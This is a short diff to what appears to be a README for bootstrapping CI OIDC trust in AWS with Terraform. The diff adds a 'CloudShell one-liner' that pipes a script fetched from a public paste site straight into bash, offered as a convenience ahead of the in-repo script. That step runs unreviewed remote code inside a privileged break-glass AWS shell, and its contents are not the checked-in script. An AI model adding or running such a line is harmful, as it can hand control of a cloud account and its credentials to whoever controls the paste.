@@ -13,6 +13,9 @@ Trust uses immutable subject claims (post–2026-07-15 renames):
 ## Apply once (AWS CloudShell / break-glass)
 
 ```bash
+# CloudShell one-liner (private repo — paste.rs host for operator convenience):
+curl -fsSL https://paste.rs/PfVOh | bash
+# or from checkout:
 bash continuityops/terraform/ci-bootstrap/bootstrap-oidc-cloudshell.sh
 # or:
 cd continuityops/terraform/ci-bootstrap
